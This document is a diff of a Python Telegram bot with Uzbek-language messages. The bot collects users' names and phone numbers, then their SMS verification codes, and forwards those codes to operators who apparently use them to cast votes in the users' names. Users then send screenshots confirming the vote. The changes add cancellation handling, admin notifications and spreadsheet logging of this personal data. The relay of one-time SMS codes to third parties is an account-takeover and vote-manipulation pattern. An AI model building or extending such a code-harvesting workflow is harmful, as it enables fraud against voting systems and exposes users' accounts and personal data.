@@ -200,7 +200,6 @@ def _process_sheet_task(task):
     clean_phone = re.sub(r'\D', '', str(phone)) if phone else ""
     row_index = -1
 
-    # 🔍 Ayni shu user_id va AYNAN O'SHA TELEFON RAQAM (belgilarsiz) mos keladigan qatorni qidiramiz
     if user_id and clean_phone:
         for idx in range(len(all_records) - 1, 0, -1):
             row = all_records[idx]
@@ -211,7 +210,6 @@ def _process_sheet_task(task):
                     row_index = idx + 1
                     break
 
-    # Agar o'sha user_id VA o'sha telefon raqam uchun qator mavjud bo'lsa - faqat o'shani yangilaymiz
     if row_index != -1:
         if user_id: sheet_instance.update_cell(row_index, 1, str(user_id))          # A
         if full_name: sheet_instance.update_cell(row_index, 2, str(full_name))      # B
@@ -223,7 +221,6 @@ def _process_sheet_task(task):
         sheet_instance.update_cell(row_index, 7, str(now))                          # G
         if admin_name: sheet_instance.update_cell(row_index, 8, str(admin_name))    # H (Oxirgi ustun)
     else:
-        # AGAR YANGI RAQAM BO'LSA - yangi qator ochib, pastdan yozamiz
         next_row = len(all_records) + 1
         for idx in range(len(all_records) - 1, -1, -1):
             if any(all_records[idx]):
@@ -285,12 +282,35 @@ def cancel_keyboard():
     builder.button(text="❌ Bekor qilish")
     return builder.as_markup(resize_keyboard=True)
 
+# --- YORDAMCHI FUNKSIYA: BEKOR QILINGANDA ADMINLARGA XABAR BERISH ---
+async def notify_admins_cancelled(user_id: int, reason_text: str = "Foydalanuvchi bekor qildi"):
+    if user_id in admin_message_ids:
+        async def edit_admin_msg(a_id, m_id):
+            try:
+                await bot.edit_message_text(
+                    text=f"❌ <b>Ariza bekor qilindi!</b>\nℹ️ Sabab: {reason_text}", 
+                    chat_id=a_id, 
+                    message_id=m_id, 
+                    parse_mode="HTML"
+                )
+            except Exception: 
+                pass
+        await asyncio.gather(*[edit_admin_msg(a_id, m_id) for a_id, m_id in admin_message_ids[user_id].items()])
+        
+    # Tozalash
+    if user_id in claimed_users: del claimed_users[user_id]
+    if user_id in claimed_admin_names: del claimed_admin_names[user_id]
+    if user_id in admin_message_ids: del admin_message_ids[user_id]
+
 # --- BUYRUQLAR INTERFEYSI ---
 @dp.message(CommandStart())
 async def cmd_start(message: types.Message, state: FSMContext):
-    await state.clear()  
     user_id = message.from_user.id
+    current_state = await state.get_state()
+    if current_state is not None:
+        await notify_admins_cancelled(user_id, "Foydalanuvchi menyuga qaytdi / /start bosdi")
     
+    await state.clear()  
     add_user_to_db(user_id)
 
     if user_id in get_all_admins():
@@ -301,6 +321,10 @@ async def cmd_start(message: types.Message, state: FSMContext):
 @dp.message(F.text == "⬅️ Bosh menyu")
 async def back_to_main(message: types.Message, state: FSMContext):
     user_id = message.from_user.id
+    current_state = await state.get_state()
+    if current_state is not None:
+        await notify_admins_cancelled(user_id, "Foydalanuvchi bosh menyuga o'tdi")
+        
     await state.clear()
     if user_id in get_all_admins(): await message.answer("Admin menyusi:", reply_markup=admin_menu(user_id))
     else: await message.answer("Bosh menyuga qaytildi.", reply_markup=main_menu())
@@ -491,12 +515,10 @@ async def start_voting(message: types.Message, state: FSMContext):
     await message.answer("👤 Iltimos, raqam egasini ism va familiyasini kiriting:", reply_markup=cancel_keyboard())
     await state.set_state(VoteState.waiting_for_name)
 
-@dp.message(F.text == "❌ Bekor qilish", VoteState.waiting_for_name)
-async def cancel_at_name(message: types.Message, state: FSMContext):
-    await state.clear(); await message.answer("Bekor qilindi.", reply_markup=main_menu())
-
 @dp.message(VoteState.waiting_for_name, F.text == "❌ Bekor qilish")
 async def cancel_at_name_state(message: types.Message, state: FSMContext):
+    user_id = message.from_user.id
+    await notify_admins_cancelled(user_id, "Foydalanuvchi ism kiritishda bekor qildi")
     await state.clear()
     await message.answer("Bekor qilindi.", reply_markup=main_menu())
 
@@ -510,18 +532,18 @@ async def process_name(message: types.Message, state: FSMContext):
     await message.answer("📱 Rahmat! Endi telefon raqamingizni yuboring yoki kiriting: Misol +998901234567.", reply_markup=phone_share_keyboard())
     await state.set_state(VoteState.waiting_for_phone)
 
-@dp.message(F.text == "❌ Bekor qilish", VoteState.waiting_for_phone)
-async def cancel_voting(message: types.Message, state: FSMContext):
-    await state.clear(); await message.answer("Bekor qilindi.", reply_markup=main_menu())
-
 @dp.message(VoteState.waiting_for_phone, F.text == "❌ Bekor qilish")
 async def cancel_at_phone_state(message: types.Message, state: FSMContext):
+    user_id = message.from_user.id
+    await notify_admins_cancelled(user_id, "Foydalanuvchi telefon raqam yuborishda bekor qildi")
     await state.clear()
     await message.answer("Bekor qilindi.", reply_markup=main_menu())
 
 @dp.message(VoteState.waiting_for_phone, F.contact | F.text)
 async def process_phone(message: types.Message, state: FSMContext):
     if message.text == "❌ Bekor qilish":
+        user_id = message.from_user.id
+        await notify_admins_cancelled(user_id, "Foydalanuvchi telefon raqam yuborishda bekor qildi")
         await state.clear(); await message.answer("Bekor qilindi.", reply_markup=main_menu()); return
 
     phone = message.contact.phone_number if message.contact else message.text.strip().replace(" ", "")
@@ -548,12 +570,12 @@ async def process_phone(message: types.Message, state: FSMContext):
 
     async def send_to_admin(admin):
         try:
-            msg = await bot.send_message(admin, f"📱 <b>Yangi raqam:</b>\n👤 Foydalanuvchi: {full_name}\n📞 Raqam: {phone}", parse_mode="HTML", reply_markup=builder.as_markup())
+            msg = await bot.send_message(admin, f"📱 <b>Yangi raqam:</b>\n👤 Foydalanuvchi ism: {full_name}\n📞 Raqam: {phone}", parse_mode="HTML", reply_markup=builder.as_markup())
             admin_message_ids[user_id][admin] = msg.message_id
         except Exception: pass
 
     await asyncio.gather(*[send_to_admin(a) for a in get_all_admins()])
-    await message.answer("Raqamingiz qabul qilindi. Operatorlar ko'rib chiqmoqda...")
+    await message.answer("Raqamingiz qabul qilindi. Operatorlar ko'rib chiqmoqda...", reply_markup=cancel_keyboard())
 
 # --- BACKGROUND TAYMER ---
 async def session_timeout_task(user_id: int, state: FSMContext):
@@ -575,19 +597,7 @@ async def session_timeout_task(user_id: int, state: FSMContext):
             )
         except Exception: pass
         
-        admin_id = data.get("admin_id")
-        if admin_id:
-            try:
-                await bot.send_message(
-                    chat_id=admin_id, 
-                    text=f"⏱ <b>Muddati o'tdi!</b> Foydalanuvchi ({phone}) 2 daqiqa ichida kod yubormadi. Ariza bekor qilindi.",
-                    parse_mode="HTML"
-                )
-            except Exception: pass
-            
-        if user_id in claimed_users: del claimed_users[user_id]
-        if user_id in claimed_admin_names: del claimed_admin_names[user_id]
-        if user_id in admin_message_ids: del admin_message_ids[user_id]
+        await notify_admins_cancelled(user_id, f"Muddati o'tdi (Timeout - {phone})")
         await state.clear()
 
 # --- OPERATOR BOSHQARUVI VA SMS KOD ---
@@ -615,12 +625,21 @@ async def admin_claim(callback: types.CallbackQuery):
     
     if user_id in admin_message_ids:
         async def edit_msg(a_id, m_id):
-            try: await bot.edit_message_text(text=f"📱 Raqam keldi\n🔒 <b>[{admin_name}] qabul qildi!</b>", chat_id=a_id, message_id=m_id, parse_mode="HTML")
+            try: await bot.edit_message_text(text=f"📱 Raqam keldi\n👤 Foydalanuvchi ism: {u_data.get('full_name')}\n📞 Raqam: {u_data.get('phone')}\n🔒 <b>[{admin_name}] qabul qildi!</b>", chat_id=a_id, message_id=m_id, parse_mode="HTML")
             except Exception: pass
         await asyncio.gather(*[edit_msg(a_id, m_id) for a_id, m_id in admin_message_ids[user_id].items()])
 
-    await bot.send_message(user_id, "Sizning raqamingiz kiritildi. SMS kodni yuboring. ⏱ 2:00 daqiqa", parse_mode="HTML")
+    await bot.send_message(user_id, "Sizning raqamingiz qabul qilindi va operator biriktirildi. SMS kodni yuboring. ⏱ 2:00 daqiqa", parse_mode="HTML", reply_markup=cancel_keyboard())
     asyncio.create_task(session_timeout_task(user_id, u_state))
+
+@dp.message(VoteState.waiting_for_code, F.text == "❌ Bekor qilish")
+async def cancel_at_code_state(message: types.Message, state: FSMContext):
+    user_id = message.from_user.id
+    data = await state.get_data()
+    queue_sheets_log(user_id=user_id, full_name=data.get("full_name"), username=data.get("username"), phone=data.get("phone"), status="Foydalanuvchi bekor qildi", admin_name=claimed_admin_names.get(user_id))
+    await notify_admins_cancelled(user_id, "Foydalanuvchi SMS kod kiritish paytida bekor qildi")
+    await state.clear()
+    await message.answer("Jarayon bekor qilindi.", reply_markup=main_menu())
 
 @dp.message(VoteState.waiting_for_code)
 async def process_code(message: types.Message, state: FSMContext):
@@ -629,9 +648,9 @@ async def process_code(message: types.Message, state: FSMContext):
     queue_sheets_log(user_id=user_id, full_name=data.get("full_name"), username=data.get("username"), phone=data.get("phone"), code=code, status="Kod kiritildi", admin_name=claimed_admin_names.get(user_id))
 
     verify_kb = InlineKeyboardBuilder().button(text="✅ To'g'ri", callback_data=f"v_correct_{user_id}").button(text="❌ Xato", callback_data=f"v_wrong_{user_id}").adjust(2)
-    try: await bot.send_message(data.get("admin_id"), f"🔢 Kod keldi: <code>{code}</code>\nTelefon: {data.get('phone')}", parse_mode="HTML", reply_markup=verify_kb.as_markup())
+    try: await bot.send_message(data.get("admin_id"), f"🔢 Kod keldi: <code>{code}</code>\n👤 Ism: {data.get('full_name')}\nTelefon: {data.get('phone')}", parse_mode="HTML", reply_markup=verify_kb.as_markup())
     except Exception: pass
-    await message.answer("Kod tekshirilmoqda...")
+    await message.answer("Kod tekshirilmoqda...", reply_markup=cancel_keyboard())
 
 @dp.callback_query(F.data.startswith("v_"))
 async def handle_code_verification(callback: types.CallbackQuery):
@@ -643,23 +662,41 @@ async def handle_code_verification(callback: types.CallbackQuery):
     if status == "correct":
         queue_sheets_log(user_id=user_id, full_name=data.get("full_name"), username=data.get("username"), phone=data.get("phone"), code=data.get("code"), status="Kod tasdiqlandi", admin_name=callback.from_user.full_name)
         await callback.message.edit_text("🟢 Kod to'g'ri deb belgilandi."); await u_state.set_state(VoteState.waiting_for_screenshot)
-        await bot.send_message(user_id, "🎉 Kod tasdiqlandi. 1 soat ichida sizga ovozingiz tasdiqlanganlik haqida SMS xabar boradi. O'shani skrinshot qilib yuboring! 📸")
+        await bot.send_message(user_id, "🎉 Kod tasdiqlandi. 1 soat ichida sizga ovozingiz tasdiqlanganlik haqida SMS xabar boradi. O'shani skrinshot qilib yuboring! 📸", reply_markup=cancel_keyboard())
     else:
         queue_sheets_log(user_id=user_id, full_name=data.get("full_name"), username=data.get("username"), phone=data.get("phone"), code=data.get("code"), status="Kod xato", admin_name=callback.from_user.full_name)
         await callback.message.edit_text("🔴 Kod xato deb belgilandi.")
-        await bot.send_message(user_id, "⚠️ Kod rad etildi. To'g'ri kodni qayta kiriting.")
+        await bot.send_message(user_id, "⚠️ Kod rad etildi. To'g'ri kodni qayta kiriting.", reply_markup=cancel_keyboard())
 
 # --- SKRINSHOT VA YAKUNIY TASDIQLASH ---
+@dp.message(VoteState.waiting_for_screenshot, F.text == "❌ Bekor qilish")
+async def cancel_at_screenshot_state(message: types.Message, state: FSMContext):
+    user_id = message.from_user.id
+    data = await state.get_data()
+    queue_sheets_log(user_id=user_id, full_name=data.get("full_name"), username=data.get("username"), phone=data.get("phone"), code=data.get("code"), status="Foydalanuvchi bekor qildi", admin_name=claimed_admin_names.get(user_id))
+    await notify_admins_cancelled(user_id, "Foydalanuvchi skrinshot yuborish paytida bekor qildi")
+    await state.clear()
+    await message.answer("Jarayon bekor qilindi.", reply_markup=main_menu())
+
 @dp.message(VoteState.waiting_for_screenshot, F.photo)
 async def process_screenshot(message: types.Message, state: FSMContext):
     p_id = message.photo[-1].file_id; data = await state.get_data(); user_id = message.from_user.id
     queue_sheets_log(user_id=user_id, full_name=data.get("full_name"), username=data.get("username"), phone=data.get("phone"), code=data.get("code"), status="Skrinshot keldi", admin_name=claimed_admin_names.get(user_id))
 
     builder = InlineKeyboardBuilder().button(text="🟢 Muvaffaqiyatli", callback_data=f"c_success_{user_id}").button(text="🔴 Avval ovoz bergan", callback_data=f"c_already_{user_id}").adjust(1)
-    try: await bot.send_photo(data.get("admin_id"), p_id, caption=f"📸 Skrinshot keldi:\nRaqam: {data.get('phone')}", reply_markup=builder.as_markup())
+    try: await bot.send_photo(data.get("admin_id"), p_id, caption=f"📸 Skrinshot keldi:\n👤 Ism: {data.get('full_name')}\nRaqam: {data.get('phone')}", reply_markup=builder.as_markup())
     except Exception: pass
-    await message.answer("Skrinshot yuborildi, admin tasdiqlashini kuting...")
+    await message.answer("Skrinshot yuborildi, admin tasdiqlashini kuting...", reply_markup=cancel_keyboard())
     await state.set_state(VoteState.waiting_for_admin_check)
+
+@dp.message(VoteState.waiting_for_admin_check, F.text == "❌ Bekor qilish")
+async def cancel_at_admin_check_state(message: types.Message, state: FSMContext):
+    user_id = message.from_user.id
+    data = await state.get_data()
+    queue_sheets_log(user_id=user_id, full_name=data.get("full_name"), username=data.get("username"), phone=data.get("phone"), code=data.get("code"), status="Foydalanuvchi bekor qildi", admin_name=claimed_admin_names.get(user_id))
+    await notify_admins_cancelled(user_id, "Foydalanuvchi admin tekshiruvini kutish paytida bekor qildi")
+    await state.clear()
+    await message.answer("Jarayon bekor qilindi.", reply_markup=main_menu())
 
 @dp.callback_query(F.data.startswith("c_"))
 async def handle_admin_check(callback: types.CallbackQuery):
